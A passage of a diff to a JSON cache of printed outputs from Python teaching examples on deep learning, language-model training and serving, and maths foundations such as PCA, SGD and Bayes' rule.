+  "out": "  R18 stage 1: 64 x 56 x 56, params so far 157,504\n  R18 stage 2: 128 x 28 x 28, params so far 683,072\n  R18 stage 3: 256 x 14 x 14, params so far 2,782,784\n  R18 stage 4: 512 x 7 x 7, params so far 11,176,512\nResNet-18 total 11,689,512\n  R50 stage 1: 256 x 56 x 56, params so far 225,344\n  R50 stage 2: 512 x 28 x 28, params so far 1,444,928\n  R50 stage 3: 1024 x 14 x 14, params so far 8,543,296\n  R50 stage 4: 2048 x 7 x 7, params so far 23,508,032\nResNet-50 total 25,557,032"
+ },
+ "python:dl-c02-rf": {
+  "hash": "3e018ac81561559e",
+  "out": "three 3x3:         (7, 1)\n3x3 stride 2 first: (11, 2)\n3x3 stride 2 last:  (7, 2)\ndilations 1,2,4:   (15, 1)\nResNet-18 convs:   (435, 32)"
+ },
+ "python:dl-c02-rnn": {
+  "hash": "2bd7b95845adebba",
+  "out": "w=0.9: w^50 = 0.005\nw=1.0: w^50 = 1.000\nw=1.1: w^50 = 117.391\nLSTM, one bias per gate: 394240\nPyTorch nn.LSTM:         395264"
+ },
+ "python:dl-c02-scale": {
+  "hash": "c3c91cdf38219f2a",
+  "out": "   d  std(q.k)  sqrt(d)  largest weight, unscaled  scaled\n   4      1.97     2.00                     0.527   0.342\n  64      8.10     8.00                     0.888   0.368\n 512     22.02    22.63                     0.955   0.359\n1024     32.49    32.00                     0.972   0.375"
+ },
+ "python:dl-c02-shape": {
+  "hash": "6b109dd224ec35ea",
+  "out": "   n   k  s  p  d  out  brute\n 224   7   2   3   1  112   112\n 112   3   2   1   1   56    56\n  32   3   1   1   1   32    32\n  32   3   2   1   1   16    16\n   7   3   2   1   1    4     4\n  32   3   1   0   2   28    28\n  32   3   1   2   2   32    32\n   8   2   2   0   1    4     4\ntransposed: 32 31 32"
+ },
+ "python:dl-c03-ap": {
+  "hash": "e4cf0b484cec7567",
+  "out": "TP flags at 0.5: [1, 1, 0, 1, 0, 1, 0, 1]\nprecision: [1.0, 1.0, 0.667, 0.75, 0.6, 0.667, 0.571, 0.625]\nrecall:    [0.2, 0.4, 0.4, 0.6, 0.6, 0.8, 0.8, 1.0]\nAP50 0.808  AP75 0.550  AP50:95 0.551"
+ },
+ "python:dl-c03-assoc": {
+  "hash": "74c30967f419e644",
+  "out": "greedy: [(0, 0)] then track 1 has only IoU 0.0\noptimal: [(0, 1), (1, 0)] total IoU 1.5"
+ },
+ "python:dl-c03-boot": {
+  "hash": "36e5caf1cac6b1ed",
+  "out": "mean error A 1.061, B 1.019, mean A-B 0.043\npaired 95% CI of A-B:   [0.019, 0.065]\nunpaired 95% CI of A-B: [-0.143, 0.223]\n5 seeds: A 1.013 +- 0.010, B 0.981 +- 0.020"
+ },
+ "python:dl-c03-c-nms": {
+  "hash": "6043184015452675",
+  "out": "agreement on random trials: 200 of 200\n[[0.333, 1.0, 0.0]]"
+ },
+ "python:dl-c03-c-track": {
+  "hash": "c07c617da2f8cedf",
+  "out": "last box           mean ID switches 1.54, mean MOTA 0.892, mean tracks created 3.00\nKalman prediction  mean ID switches 0.08, mean MOTA 0.927, mean tracks created 2.00"
+ },
+ "python:dl-c03-clip": {
+  "hash": "71b0a6176b1a67f8",
+  "out": "ln(N) = 4.159\nmatched pairs  tau  1.0: loss   3.288, image-to-text accuracy 1.000\nmatched pairs  tau 0.07: loss   0.000, image-to-text accuracy 1.000\nrandom pairs   tau  1.0: loss   4.174, image-to-text accuracy 0.000\nrandom pairs   tau 0.07: loss   5.139, image-to-text accuracy 0.000"
+ },
+ "python:dl-c03-d-format": {
+  "hash": "9ebbed950eebb1e8",
+  "out": "wrong format: 0.64  correct: 0.681"
+ },
+ "python:dl-c03-focal": {
+  "hash": "b0d09fbf69025adc",
+  "out": "  p_t      CE   focal(gamma=2)\n 0.99   0.010     0.00000\n 0.90   0.105     0.00105\n 0.50   0.693     0.17329\n 0.10   2.303     1.86509\nCE     total from easy   1005.03, from hard  230.26\nfocal  total from easy      0.10, from hard  186.51\ngrid 50 x 50 with 9 anchors: 22500 candidates"
+ },
+ "python:dl-c03-fusion": {
+  "hash": "98288ab9e2d4d5e5",
+  "out": "weight on the better sensor 0.80, theory var 0.800\nvar: a 1.002, b 4.013, fused 0.800\nsensor b offset by 3: fused error mean 0.600, MSE 1.161, sensor a alone MSE 1.002"
+ },
+ "python:dl-c03-iou": {
+  "hash": "6d5db407bcf17da7",
+  "out": "same                   1.000\nhalf shifted           0.333\ntouching               0.000\ndisjoint in both axes  0.000\ninside                 0.250\n10px box, 2px error: 0.471\n40px box, 2px error: 0.822\n160px box, 2px error: 0.952"
+ },
+ "python:dl-c03-kalman": {
+  "hash": "3a57edd856fe2613",
+  "out": " t  truth  meas  est    vel   std(pos)\n 1    1.5    1.2    1.2  0.85    1.94\n10   15.0   13.8   14.2  1.30    1.16\n24   36.0   37.8   37.0  1.71    1.04\n29   43.5   43.9   45.6  1.71    2.16\n30   45.0   43.0   44.7  1.41    1.55\n39   58.5   61.5   59.5  1.65    1.04\nRMS error, t >= 10: measurements 1.68, filter 1.09"
+ },
+ "python:dl-c03-latency": {
+  "hash": "dfc6f866606a8417",
+  "out": "capture + transfer   mean   5.1 ms, p99   8.0 ms\npreprocess           mean   3.1 ms, p99   4.8 ms\ninference            mean  15.5 ms, p99  26.9 ms\ntrack + publish      mean   2.3 ms, p99   6.4 ms\nend to end           mean  25.9 ms, p50  25.5, p99  37.9, max  55.1\nover a 33.3 ms frame budget: 5.5% of frames\nobject at 1.5 m/s moves 0.057 m during p99 latency\nobject at 10.0 m/s moves 0.379 m during p99 latency"
+ },
+ "python:dl-c03-leak": {
+  "hash": "bdef3b98ac132086",
+  "out": "random frame split: 1.000\nsplit by video:     0.383"
+ },
+ "python:dl-c03-nms": {
+  "hash": "5ea0c266260a70cf",
+  "out": "one object plus one far away: [0, 3]\ncrowd IoU 0.429\n  thr 0.3: keeps [0]\n  thr 0.5: keeps [0, 1]"
+ },
+ "python:dl-c03-project": {
+  "hash": "ad9afab25c0c337c",
+  "out": "depth  1deg yaw err  0.1m shift err  0.05s at 10m/s  person width (0.5m)\n    5          18.2            20.0           100.0                100.0\n   20          17.5             5.0            25.0                 25.0\n   50          17.5             2.0            10.0                 10.0"
+ },
+ "python:dl-c03-seg": {
+  "hash": "7870b00f445e041b",
+  "out": "all background     pixel acc 0.952  IoU 0.952/0.000  mIoU 0.476  Dice 0.000\nobject shifted 4px pixel acc 0.968  IoU 0.967/0.503  mIoU 0.735  Dice 0.669"
+ },
+ "python:dl-c03-traj": {
+  "hash": "1c935e84db967caf",
+  "out": "stay still           ADE 3.387 m  FDE 6.140 m\nCV, last step        ADE 1.120 m  FDE 2.696 m\nCV, mean velocity    ADE 1.635 m  FDE 3.628 m\nrandom heading spread, K= 1: minADE 2.203  minFDE 4.446\nrandom heading spread, K= 5: minADE 0.785  minFDE 1.655\nrandom heading spread, K=20: minADE 0.407  minFDE 0.740"
+ },
+ "python:dl-home-hero": {
+  "hash": "18028c84d42e56f9",
+  "out": "12.000 12.000"
+ },
  "python:ec-c03-d-rms": {
   "hash": "0aa5f56e1ded12e6",
   "out": "U = 0.9\nR -> 3\nR -> 4\nR -> 4"
@@ -862,6 +1258,618 @@
  "python:el-c06-d-triplet": {
   "hash": "942a13cb9a0979c5",
   "out": "('aarch64', 'linux', 'gnu')\n('arm', 'linux', 'gnueabihf')\n('riscv64', 'linux', 'musl')\n('arm', 'none', 'eabi')"
+ },
+ "python:lm-c01-beam": {
+  "hash": "420ee47366ec4fa7",
+  "out": "width 1 [('Ax', 0.2)]\nwidth 2 [('Bx', 0.36), ('Ax', 0.2)]"
+ },
+ "python:lm-c01-bigram": {
+  "hash": "e6003839b1f3c92c",
+  "out": "vocabulary 14, ln(V) = 2.639\nstep     0  loss 2.639\nstep    10  loss 1.327\nstep   100  loss 0.742\nstep   500  loss 0.704\nstep  2000  loss 0.698\nbest any bigram model can do: 0.697"
+ },
+ "python:lm-c01-bpe": {
+  "hash": "7223f644731ac228",
+  "out": "merge 't'      + '</w>'   seen 9\nmerge 's'      + 't</w>'  seen 9\nmerge 'e'      + 'st</w>' seen 9\nmerge 'o'      + 'w'      seen 7\nmerge 'l'      + 'ow'     seen 7\nmerge 'w'      + 'est</w>' seen 6\nmerge 'n'      + 'e'      seen 6\nmerge 'ne'     + 'west</w>' seen 6\ncorpus now: ['low </w>', 'low e r </w>', 'newest</w>', 'w i d est</w>']\nnewest  -> ['newest</w>']\nlowest  -> ['low', 'est</w>']\nslower  -> ['s', 'low', 'e', 'r', '</w>']\nzebra   -> ['z', 'e', 'b', 'r', 'a', '</w>']"
+ },
+ "python:lm-c01-c-attn": {
+  "hash": "5f2836d81ed275cf",
+  "out": "output shape (6, 16)\ncausal output unchanged by position: [True, True, True, True, False, False]\nno mask output unchanged by position: [False, False, False, False, False, False]"
+ },
+ "python:lm-c01-c-bpe": {
+  "hash": "9c77a5b28925bc9e",
+  "out": "merges learned: 20\n'the theme'      bytes  9  tokens  5  round trip True\n'theory'         bytes  6  tokens  5  round trip True\n'naïve café 語'   bytes 16  tokens 16  round trip True\ntraining text bytes 520 tokens 103"
+ },
+ "python:lm-c01-c-topp": {
+  "hash": "74419225242e4045",
+  "out": "p=0.9 T=1.0  kept=4\n  target 0.579 0.213 0.129 0.078 0.000 0.000\n  freq   0.574 0.214 0.133 0.078 0.000 0.000\np=0.9 T=0.5  kept=2\n  target 0.881 0.119 0.000 0.000 0.000 0.000\n  freq   0.877 0.123 0.000 0.000 0.000 0.000\np=0.5 T=1.0  kept=1\n  target 1.000 0.000 0.000 0.000 0.000 0.000\n  freq   1.000 0.000 0.000 0.000 0.000 0.000\np=1.0 T=1.0  kept=6\n  target 0.547 0.201 0.122 0.074 0.045 0.010\n  freq   0.549 0.201 0.125 0.073 0.041 0.011"
+ },
+ "python:lm-c01-d-merge": {
+  "hash": "cbef8c7d51201e68",
+  "out": "('u', 'g') 20\n('p', 'u') 17\n('u', 'n') 16\n('h', 'u') 15\n('g', 's') 5\n('b', 'u') 4"
+ },
+ "python:lm-c01-d-topp": {
+  "hash": "ed9887f7f1aa9b73",
+  "out": "cumulative [0.5  0.7  0.85 0.95 1.  ]\nkept 3 top token now 0.588"
+ },
+ "python:lm-c01-decode": {
+  "hash": "2a527af367876afb",
+  "out": "              Paris    the      a London   Rome banana\nT=0.5         0.826  0.112  0.041  0.015  0.006  0.000\nT=1.0         0.547  0.201  0.122  0.074  0.045  0.010\nT=2.0         0.349  0.211  0.165  0.128  0.100  0.047\ntop-k k=3     0.629  0.231  0.140  0.000  0.000  0.000\ncumulative    0.547  0.749  0.871  0.945  0.990  1.000\ntop-p p=0.9 keeps 4 tokens\ntop-p p=0.9   0.579  0.213  0.129  0.078  0.000  0.000"
+ },
+ "python:lm-c01-hall": {
+  "hash": "aacc59584260a2d3",
+  "out": "prompt: rome is the capital of ...\nT=1.0 {'france': 0.5, 'italy': 0.25, 'japan': 0.25}\nT=0.2 {'france': 0.941, 'italy': 0.029, 'japan': 0.029}\nevery word pair below appears in the training data:\n  ('rome', 'is') 1\n  ('is', 'the') 4\n  ('the', 'capital') 4\n  ('capital', 'of') 4\n  ('of', 'france') 2"
+ },
+ "python:lm-c01-kv": {
+  "hash": "fc99ed6851f1be9a",
+  "out": "outputs match: True\n  tokens  key/value computed       query-key scores\n          no cache     cached     no cache      cached\n       8         36          8          204          36\n      64      2,080         64       89,440       2,080\n    1024    524,800      1,024  358,438,400     524,800"
+ },
+ "python:lm-c01-mask": {
+  "hash": "1550d15a2040f0db",
+  "out": "[[1 0 0 0 0]\n [1 1 0 0 0]\n [1 1 1 0 0]\n [1 1 1 1 0]\n [1 1 1 1 1]]\n[[1.   0.   0.   0.   0.  ]\n [0.02 0.98 0.   0.   0.  ]\n [0.17 0.22 0.62 0.   0.  ]\n [0.08 0.3  0.11 0.51 0.  ]\n [0.31 0.07 0.12 0.07 0.43]]\nrow sums: [1. 1. 1. 1. 1.]"
+ },
+ "python:lm-c01-params": {
+  "hash": "8b6c8362d8d994d3",
+  "out": "token embeddings       38,597,376   31.0%\nposition embeddings       786,432    0.6%\nall attention          28,348,416   22.8%\nall MLPs               56,669,184   45.5%\nall LayerNorms             38,400    0.0%\ntotal (tied head)     124,439,808\nan untied head adds    38,597,376"
+ },
+ "python:lm-c01-scale": {
+  "hash": "e7563841aeee5dac",
+  "out": "   d  std(score)  std(scaled)  top weight  top weight scaled\n   4        2.01         1.01        0.59               0.38\n  64        7.98         1.00        0.88               0.37\n1024       31.86         1.00        0.97               0.37"
+ },
+ "python:lm-c02-c-dpo": {
+  "hash": "4abae76b65666be7",
+  "out": "ln 2 = 0.693\npolicy = reference       0.693\nprefers chosen           0.313\nprefers rejected         1.313\npolicy = reference, ref term dropped 0.974\nresponse log probs under the reference: [-3.] [-2.]\nchanging masked positions, loss 0.693"
+ },
+ "python:lm-c02-c-lora": {
+  "hash": "03aaab99d6d73763",
+  "out": "full matrix params 1,024, base test MSE 0.0859\n r  params  % of full  test MSE\nstarts equal to base: True\n 1      64        6.2    0.0331\n 2     128       12.5    0.0073\n 3     192       18.8    0.0000\n 4     256       25.0    0.0000\n 8     512       50.0    0.0000\nW unchanged: True\nmerged matches adapter: True"
+ },
+ "python:lm-c02-count": {
+  "hash": "d4dbaf10821e4133",
+  "out": "128 matrices, full update 2,147,483,648 parameters\n r    adapter params   % of targeted   % of whole model   MB at 32-bit\n 4        4,194,304           0.20              0.060           16.8\n 8        8,388,608           0.39              0.120           33.6\n16       16,777,216           0.78              0.240           67.1\n32       33,554,432           1.56              0.479          134.2"
+ },
+ "python:lm-c02-d-count": {
+  "hash": "bdb33665de5ebd41",
+  "out": "m=768 n=768 r=4: lora 6,144  full 589,824  1.04%\nm=2048 n=512 r=16: lora 40,960  full 1,048,576  3.91%"
+ },
+ "python:lm-c02-d-init": {
+  "hash": "5152265fe1983669",
+  "out": "A random, B zero   |grad B|  25.550  |grad A|   0.000  same as base: True\nboth zero          |grad B|   0.000  |grad A|   0.000  same as base: True\nboth random        |grad B|  52.219  |grad A|  51.266  same as base: False"
+ },
+ "python:lm-c02-d-mem": {
+  "hash": "1bb7ae17ec3b3df5",
+  "out": "16-bit               16.000 bits/weight   26.00 GB\n8-bit                 8.000 bits/weight   13.00 GB\nNF4 + double quant    4.127 bits/weight    6.71 GB"
+ },
+ "python:lm-c02-dpo": {
+  "hash": "8a5a6db263fdc7af",
+  "out": "ref            0.400 0.300 0.200 0.100\nbeta=2.0       0.391 0.228 0.322 0.059   loss 0.693 -> 0.555\nclosed form    0.391 0.228 0.322 0.059\nbeta=1.0       0.344 0.157 0.468 0.032   loss 0.693 -> 0.555\nclosed form    0.344 0.157 0.468 0.032\nbeta=0.5       0.200 0.055 0.738 0.007   loss 0.693 -> 0.555\nclosed form    0.200 0.055 0.738 0.007"
+ },
+ "python:lm-c02-kl": {
+  "hash": "7f92775c2c89e280",
+  "out": "  beta    accurate      brief flattering   rambling\n   ref       0.400      0.300      0.200      0.100\n  5.00       0.407      0.276      0.230      0.087\n  1.00       0.404      0.184      0.368      0.045\n  0.30       0.206      0.029      0.761      0.004\n  0.05       0.000      0.000      1.000      0.000"
+ },
+ "python:lm-c02-labels": {
+  "hash": "a3e8eb2d121c3500",
+  "out": "position input         label (before the model's one-token shift)\n0        <user>        -100\n1        translate     -100\n2        cat           -100\n3        to            -100\n4        french        -100\n5        <assistant>   -100\n6        chat          chat\n7        </s>          </s>\n8        <pad>         -100\n9        <pad>         -100\ntrained positions: 2\nlong prompt, trained positions: 0"
+ },
+ "python:lm-c02-lowrank": {
+  "hash": "727543c6d65c61a8",
+  "out": " r  params(BA)  % of full   relative error\n 1         400       1.0            0.804\n 2         800       2.0            0.618\n 3       1,200       3.0            0.386\n 4       1,600       4.0            0.382\n 8       3,200       8.0            0.368\n32      12,800      32.0            0.293"
+ },
+ "python:lm-c02-nf4": {
+  "hash": "26e33ddb396a49ea",
+  "out": "levels (first 8): -0.78 -0.52 -0.40 -0.30 -0.22 -0.16 -0.09 -0.03\ngrid       bucket share   entropy   MSE all   MSE |x|<0.25   MSE |x|>=0.25\nuniform    0.011-0.135     3.59   0.00146       0.00136        0.00154\nnf4-style  0.051-0.070     4.00   0.00240       0.00033        0.00432\nbits per weight: 4.500 with 32-bit scales, 4.127 with double quantization"
+ },
+ "python:lm-c02-overfit": {
+  "hash": "afef187f52ab007a",
+  "out": "observed entries 1434 of 3600\nrank  params  train RMSE  held-out RMSE\n   1     120        0.82           0.91\n   2     240        0.63           0.79\n   3     360        0.43           0.60\n   5     600        0.35           0.78\n  10    1200        0.15           1.12"
+ },
+ "python:lm-c02-ppo": {
+  "hash": "043394bbaf845530",
+  "out": "advantage  ratio  unclipped  clipped  objective\n      1.0    0.5       0.50     0.80       0.50\n      1.0    1.0       1.00     1.00       1.00\n      1.0    1.5       1.50     1.20       1.20\n     -1.0    0.5      -0.50    -0.80      -0.80\n     -1.0    1.0      -1.00    -1.00      -1.00\n     -1.0    1.5      -1.50    -1.20      -1.50"
+ },
+ "python:lm-c02-qmem": {
+  "hash": "b387a0574b301a2f",
+  "out": "                             base  trained   grads    adam   total   GB\nfull fine-tune, 16-bit        0.0    14.00   14.00   28.00    56.0\nLoRA, 16-bit base            14.0     0.03    0.03    0.07    14.1\nQLoRA, NF4 + double quant     3.6     0.03    0.03    0.07     3.7"
+ },
+ "python:lm-c02-reward": {
+  "hash": "a504f75878edb22a",
+  "out": "step   0  loss 0.693\nstep 500  loss 0.339\ntrue weights    [ 2.  -1.   0.5  0. ]\nlearned weights [ 1.98 -1.02  0.52  0.03]\nagrees with held-out human choices: 0.852\nloss with rewards as learned 0.339, with 5 added to all 0.339"
+ },
+ "python:lm-c03-awq": {
+  "hash": "bf81c4d6bd62aed3",
+  "out": "  s   output MSE\n  1       1.688\n  2       1.688\n  4       0.753\n  8       0.637\n 16       0.573\n 32       0.555\n 64       1.585\nbest s = 32, error falls by a factor of 3.0"
+ },
+ "python:lm-c03-c-batch": {
+  "hash": "447a5026b300b740",
+  "out": "gap prefill mode        ttft  ttft95    e2e   e2e95  tok/tick  slot use  stall ticks\n 30       0 static        118     352    168     426      1.58      0.20            0\n 30       0 continuous      2       2     51     258      1.59      0.20            0\n 12       0 static       1254    2369   1304    2406      2.65      0.33            0\n 12       0 continuous      2       2     51     259      3.84      0.48            0\n  6       0 static       2458    4846   2508    4869      2.65      0.33            0\n  6       0 continuous     68     171    118     300      7.19      0.90            0\n  6       3 static       2538    4996   2587    5017      2.60      0.33          153\n  6       3 continuous    532    1009    601    1072      5.29      0.93         1107"
+ },
+ "python:lm-c03-c-mem": {
+  "hash": "1b498c0a36c810c5",
+  "out": "config                         weights  per req  requests\n16-bit, no GQA                   24.2G    1.56G        13\n4-bit, no GQA                     6.2G    1.56G        25\n16-bit, GQA                      24.2G    0.31G        69\n4-bit, GQA                        6.2G    0.31G       127\n16-bit, GQA, 512-token limit     24.2G    0.08G       278"
+ },
+ "python:lm-c03-cost": {
+  "hash": "d5d8022a5e014cd7",
+  "out": "peak demand 9,000 tokens/s, replicas at 70% load: 7\ncost per million tokens at 100% average busy: 0.28\ncost per million tokens at 70% average busy: 0.40\ncost per million tokens at 30% average busy: 0.93\nmonthly, 7 replicas always on: 10,080\nmonthly, 7 for 8 hours a day and 2 otherwise: 5,280"
+ },
+ "python:lm-c03-d-cap": {
+  "hash": "5da2bba31aaf6a92",
+  "out": "demand 10000 tokens/s\nreplicas 12\nin flight 200"
+ },
+ "python:lm-c03-d-mem": {
+  "hash": "65b3b2a3428ac1af",
+  "out": "weights 16-bit 24.2 GiB, 4-bit 6.1 GiB\ncache per token 819,200 bytes = 0.78 MiB\ncache for 2048 tokens 1.56 GiB"
+ },
+ "python:lm-c03-d-spec": {
+  "hash": "318800a093cb7f66",
+  "out": "acceptance 0.8\nresidual [1. 0. 0.]\n0 accept probability 1.0\n1 accept probability 0.667\n2 accept probability 0.5"
+ },
+ "python:lm-c03-flash": {
+  "hash": "35aa06fb3de8902f",
+  "out": "same output: True\nscore values held at once: standard 4,194,304, blocked 16,384\nreduction factor: 256"
+ },
+ "python:lm-c03-gptq": {
+  "hash": "8c7067fd503fba07",
+  "out": "inputs        output MSE: round  gptq-style   weight MSE: round  gptq-style   gptq wins\ncorrelated                0.853       0.258               0.008       0.025       19/20\nindependent               0.111       0.110               0.007       0.007        6/20"
+ },
+ "python:lm-c03-kv": {
+  "hash": "261b0dfae7b19988",
+  "out": "kv_heads  MiB/token   GiB at 1024 tokens   GiB at 4096 tokens\n      32      0.500                 0.50                 2.00\n       8      0.125                 0.12                 0.50\nrequests of 2048 tokens that fit in 40 GiB:\n  kv_heads=32: 40\n  kv_heads=8: 160"
+ },
+ "python:lm-c03-mem": {
+  "hash": "10d3370aa5cbb3fa",
+  "out": "format             bits      7B     13B     70B   (GiB)\nfp32             32.000    26.1    48.4   260.8\nfp16             16.000    13.0    24.2   130.4\nint8              8.000     6.5    12.1    65.2\n4-bit             4.000     3.3     6.1    32.6\n4-bit + scales    4.125     3.4     6.2    33.6\n70B at 4 bits is 35.0 GB, or 32.6 GiB"
+ },
+ "python:lm-c03-metrics": {
+  "hash": "563a4c4e783fc682",
+  "out": "req  TTFT   ITL    E2E  tok/s\nr1    220    40    420   14.3\nr2    350    50    500    8.0\nr3    800    60   1220    6.6\naggregate 13.6 tokens/s"
+ },
+ "python:lm-c03-pad": {
+  "hash": "aa22c0d010af1110",
+  "out": "the model predicts from the last position:\nright padded: ['<pad>', 'prompt', '<pad>']\nleft padded:  ['cat', 'prompt', 'hi']\nreal tokens 7 of 12 cells, 42% is padding"
+ },
+ "python:lm-c03-pages": {
+  "hash": "0ac0a922dc8cae17",
+  "out": "mean length 271, longest 2293\ncontiguous reservation of 4096: 24 requests\npaged with 16-token blocks: 361 requests, last-block waste 2.9%\n4 completions of one 512-token prompt: 2560 tokens copied, 1024 shared"
+ },
+ "python:lm-c03-queue": {
+  "hash": "68a7e6c3a4bd9a1b",
+  "out": "utilisation   time in system (x service time)\n       0.50        2.0\n       0.70        3.3\n       0.80        5.0\n       0.90       10.0\n       0.95       20.0\n       0.99      100.0\nLittle's law: 20 requests/s x 3.0 s = 60 in flight"
+ },
+ "python:lm-c03-spec": {
+  "hash": "ec45995f4b8187a8",
+  "out": "target p   0.500 0.250 0.150 0.100\nempirical  0.502 0.250 0.149 0.099\nacceptance measured 0.849, predicted 0.850\n\ntokens per target pass, then relative time per token, draft step = 10% of a target step\n accept      k=1          k=3          k=5          k=8\n   0.5   1.50  0.73   1.88  0.69   1.97  0.76   2.00  0.90\n   0.7   1.70  0.65   2.53  0.51   2.94  0.51   3.20  0.56\n   0.9   1.90  0.58   3.44  0.38   4.69  0.32   6.13  0.29"
+ },
+ "python:lm-home-hero": {
+  "hash": "17fd01f486d9009d",
+  "out": "full update    16,777,216 parameters\nLoRA update        65,536 parameters\nLoRA is 0.39% of the full matrix"
+ },
+ "python:mf-c01-ab": {
+  "hash": "ed2f83e051ac6d72",
+  "out": "lift 0.025  z 2.50  p 0.0124\n95% CI for the lift [0.005, 0.045]\npermutation p 0.015\nn per group ~ 14735"
+ },
+ "python:mf-c01-bayes": {
+  "hash": "a8cea5111a5294ed",
+  "out": "P(sick | one positive)  = 0.1667\nP(sick | two positives) = 0.7984  (tests independent given status)\nsimulated, one positive = 0.167"
+ },
+ "python:mf-c01-c-adam": {
+  "hash": "0f2004b82ee955de",
+  "out": "epoch  1: loss 0.437  accuracy 0.845\nepoch  5: loss 0.319  accuracy 0.861\nepoch 20: loss 0.312  accuracy 0.859\nweights [1.8, -2.9, 0.4, 0.6]"
+ },
+ "python:mf-c01-c-pca": {
+  "hash": "2f8644782bcc4909",
+  "out": "k=1 reconstruction  10.784  dropped variance  10.784\nk=2 reconstruction   1.296  dropped variance   1.296\nk=3 reconstruction   0.298  dropped variance   0.298\nk=6 reconstruction   0.000  dropped variance   0.000"
+ },
+ "python:mf-c01-clt": {
+  "hash": "8792f1546ba0a5d4",
+  "out": "sample means of an Exponential(mean 1), a very skewed distribution\n    n   std  1/sqrt(n)  skew  2/sqrt(n)  coverage of mean +/- 1.96 s/sqrt(n)\n    1 0.991     1.000   1.97      2.00  n/a\n    5 0.454     0.447   0.90      0.89  0.812\n   30 0.183     0.183   0.38      0.37  0.916\n  200 0.071     0.071   0.13      0.14  0.943\nspread (IQR) of the sample mean as n grows\n    n  normal  cauchy\n    1   1.338   1.994\n  100   0.139   1.995\n 2000   0.030   2.054"
+ },
+ "python:mf-c01-cond": {
+  "hash": "f07da8696a6120cb",
+  "out": "steps until f < 1e-6 on a quadratic with condition number 100\naxis-aligned    GD    653  momentum    138  Adam    305\nrotated 30 deg  GD    684  momentum    132  Adam   1410"
+ },
+ "python:mf-c01-d-eig": {
+  "hash": "4db7b0ae5c9aa148",
+  "out": "[1.0, 9.0]\n[4.0, 6.0]\n[2.0, 1.0]"
+ },
+ "python:mf-c01-d-geom": {
+  "hash": "2be6f67824216e8a",
+  "out": "4.00 12.03"
+ },
+ "python:mf-c01-d-mse": {
+  "hash": "cb9db48ba40fb4a0",
+  "out": "p = 0.00034\nMSE gradient magnitude: 0.00067\ncross-entropy gradient magnitude: 0.99966"
+ },
+ "python:mf-c01-d-pcabug": {
+  "hash": "94cedd4812b02724",
+  "out": "variance share 0.999\nPC1 [0.924, 0.381]\ncentred share 0.9207\ncentred PC1 [0.665, 0.747]"
+ },
+ "python:mf-c01-d-shuffle": {
+  "hash": "f63b6fc88aac0b4e",
+  "out": "shuffle=False accuracy 0.762  predicted positive 0.708\nshuffle=True  accuracy 0.838  predicted positive 0.487"
+ },
+ "python:mf-c01-d-spam": {
+  "hash": "8cf14dcbae3396df",
+  "out": "0.918"
+ },
+ "python:mf-c01-eig": {
+  "hash": "d5766d34eccfd217",
+  "out": "eigenvalues  [1.0, 3.0]\neigenvectors [[0.707, -0.707], [0.707, 0.707]]\ntrace 4.0  sum 4.0\ndet   3.0  product 3.0\nstep 1: Rayleigh quotient 2.8000\nstep 2: Rayleigh quotient 2.9756\nstep 3: Rayleigh quotient 2.9973\nstep 4: Rayleigh quotient 2.9997\nstep 5: Rayleigh quotient 3.0000\nstep 6: Rayleigh quotient 3.0000\nrotation eigenvalues, imaginary parts [-1.0, 1.0]"
+ },
+ "python:mf-c01-expect": {
+  "hash": "79734f212fffccc5",
+  "out": "fixed points of a random permutation: 1.01\nVar(X)+Var(Y)=2.00  Var(X+Y)=3.61  2Cov=1.60\nCov(X, X^2)=0.00\nE[X^2]=1.00  E[X^2 given |X|>1]=2.53"
+ },
+ "python:mf-c01-grad": {
+  "hash": "45551e036c907a20",
+  "out": "analytic  [0.117, 0.0319, 0.2249]\nnumeric   [0.117, 0.0319, 0.2249]\ncorrect gradient passes: True\nbuggy gradient passes:   False\nstart -2.0 -> x = -1.301, f = -3.514\nstart +2.0 -> x = +1.131, f = -1.070"
+ },
+ "python:mf-c01-lr": {
+  "hash": "314c8e09dd223a24",
+  "out": "lr=0.3: +1.00 +0.70 +0.49 +0.34 +0.24 ...  after 20 steps +0.001\nlr=1.0: +1.00 +0.00 +0.00 +0.00 +0.00 ...  after 20 steps +0.000\nlr=1.9: +1.00 -0.90 +0.81 -0.73 +0.66 ...  after 20 steps +0.122\nlr=2.1: +1.00 -1.10 +1.21 -1.33 +1.46 ...  after 20 steps +6.727"
+ },
+ "python:mf-c01-mle": {
+  "hash": "182146cb414140ee",
+  "out": "   k    n   MLE  MAP Beta(3,3)  formula\n   7   10 0.700       0.643    0.643\n  70  100 0.700       0.692    0.692\n 700 1000 0.700       0.699    0.699"
+ },
+ "python:mf-c01-mle-var": {
+  "hash": "a3007efd91cbcac9",
+  "out": "divide by n     3.20\ndivide by n-1   4.00"
+ },
+ "python:mf-c01-nullsim": {
+  "hash": "ce0c57ec59577b9f",
+  "out": "one test            false positive rate 0.049\np-value quartiles   0.25 0.50 0.76\nbest of 20 metrics  false positive rate 0.635\nwith Bonferroni     false positive rate 0.044\npeek 20 times       false positive rate 0.242"
+ },
+ "python:mf-c01-pca": {
+  "hash": "cc127c0469e93738",
+  "out": "components [[0.754, 0.657], [-0.657, 0.754]]\nvariances  [15.846, 0.6]  explained [0.964, 0.036]\ncov eigen  [15.846, 0.6]\nnot centred, far from origin, PC1: [0.707, 0.707]\nrescale column 1 by 1000, PC1:     [1.0, 0.001]\nclassify using only PC1: accuracy 0.504\nclassify using only PC2: accuracy 1.000"
+ },
+ "python:mf-c01-sgd": {
+  "hash": "c5de0aa5f3ba0123",
+  "out": "3 epochs each: updates and excess MSE above the best fit\nfull batch             updates     3  excess 1.4184\nbatch 256              updates    24  excess 0.0169\nbatch 32               updates   189  excess 0.0005\nbatch 1                updates  6000  excess 0.0617\nbatch 1, decaying lr   updates  6000  excess 0.0022\nB=  1: std of one gradient component 4.061\nB= 16: std of one gradient component 1.064\nB=256: std of one gradient component 0.261"
+ },
+ "python:mf-c01-svd": {
+  "hash": "d91938ff8206823e",
+  "out": "top singular values [66.79, 62.94, 53.76, 1.57, 1.53, 1.48]\nk=1: error share 0.6069  tail formula 0.6069\nk=2: error share 0.2579  tail formula 0.2579\nk=3: error share 0.0031  tail formula 0.0031\nk=4: error share 0.0029  tail formula 0.0029\nsingular values^2 match eigenvalues of A'A: True\northonormal columns in U: True"
+ },
+ "python:mf-c02-boost": {
+  "hash": "b2884c92e053c374",
